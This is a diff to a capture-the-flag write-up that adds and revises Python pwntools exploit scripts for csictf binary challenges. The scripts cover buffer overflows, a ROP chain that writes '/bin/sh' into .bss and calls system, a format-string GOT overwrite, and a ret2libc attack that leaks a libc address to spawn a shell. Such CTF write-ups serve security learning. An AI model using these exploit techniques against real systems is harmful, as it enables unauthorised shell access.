@@ -79,6 +79,9 @@ p.interactive()
 ```
 
 ### pwn intended 0x2
+For this challenge there are 2 ways to solve it, one, the simplest, is to generate a bufferoverflow and then send the value to make the condition true, while the other solution is to inject a shell because a memory area is executable
+
+#### first method
 ```python
 from pwn import * 
 elf = ELF("pwn-intended-0x2")
@@ -92,6 +95,36 @@ payload += p64(0xCAFEBABE)
 r.sendlineafter("\n", payload)
 r.interactive()
 # csictf{c4n_y0u_re4lly_telep0rt?}
+```
+#### second method
+```python
+from pwn import *
+
+elf = ELF("pwn-intended-0x2")
+rop = ROP(elf)
+HOST = "chall.csivit.com"
+PORT = 30007
+p = remote(HOST, PORT)
+offset = 56
+
+POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+bss = 0x4040a0
+log.success('pop rdi; ret @ %s' % hex(POP_RDI))
+log.info("sending the first payload")
+payload = b"A" * 56 + p64(POP_RDI) + p64(bss) + p64(elf.plt['gets']) + p64(elf.sym['main'])
+p.recvline()
+sleep(1)
+p.sendline(payload)
+p.sendline("/bin/sh\0")
+log.success("done writing /bin/sh")
+
+log.info("sending the second payload")
+payload2 = b"A" * offset + p64(POP_RDI) + p64(bss) + p64(elf.plt['system'])
+p.sendline(payload2)
+p.recvuntil("Welcome to csictf! Where are you headed?\nSafe Journey!\n")
+p.interactive()
+
+# FLAG --> csictf{c4n_y0u_re4lly_telep0rt?}
 ```
 
 ### pwn intended 0x3
@@ -120,7 +153,7 @@ PORT = 30041
 p = remote(HOST, PORT)
 
 p.sendlineafter("\n", "A" * 150)
-p.stream()
+p.interactive()
 
 ```
 ### Global Warming
@@ -136,7 +169,7 @@ p = remote(HOST, PORT)
 write = {0x804c02c: 0xb4dbabe3}
 payload = fmtstr_payload(12, write)
 p.sendline(payload)
-p.stream()
+p.interactive()
 
 # FLAG --> csictf{n0_5tr1ng5_@tt@ch3d}
 ```
@@ -147,39 +180,50 @@ from pwn import *
 
 exe = ELF("hello")
 libc = ELF("libc.so.6")
-ld = ELF("./ld-2.23.so")
-rop = ROP("./hello")
-r = remote("chall.csivit.com", 30046)
+HOST = "chall.csivit.com"
+PORT = 30046
+p = remote(HOST, PORT)
 
-print(r.recvline())
+p.recvline()
 offset = 136
-
+log.info("sending the first payload...")
 payload = b"M" * offset
 payload += p32(exe.plt["puts"])
 payload += p32(exe.sym["main"])
 payload += p32(exe.got["malloc"])
-r.sendline(payload)
+p.sendline(payload)
+log.info("first payload done")
+sleep(1.5)
 
-r.recvuntil("!\n")
-malloc = u32(r.recv(4))
+log.info("leak libc_base...")
+p.recvuntil("!\n")
+malloc = u32(p.recv(4))
 libc_base = malloc - libc.sym["malloc"]
-log.info("Libc base address --> %s", hex(libc_base))
+log.success("Libc base address --> %s", hex(libc_base))
+log.info("libc base leaked")
+sleep(1.5)
 
 system = libc_base + libc.sym["system"]
-binsh = libc_base + next(libc.search(b"/bin/sh"))
+log.success("system --> 0x%x" % system)
+bin_sh = libc_base + next(libc.search(b"/bin/sh"))
+sleep(1.5)
 
-payload2 = b"M" * offset
-payload2 += p32(system)
-payload2 += b"MMMM"
-payload2 += p32(binsh)
+log.info("sending the second payload...")
+payload = b"A" * offset
+payload += p32(system)
+payload += b"AAAA"
+payload += p32(bin_sh)
+p.recvlines(2)
+p.sendline(payload)
+log.info("second payload done")
+sleep(1.5)
 
-for _ in range(2):
-    r.recvline()
-r.sendline(payload2)
-r.interactive()
+p.recvuntil('!\n')
+log.info("spawning shell...")
+sleep(1)
+p.interactive()
 
 # FLAG --> csictf{5up32_m4210_5m45h_8202}
-
 ```
 ## Web
 
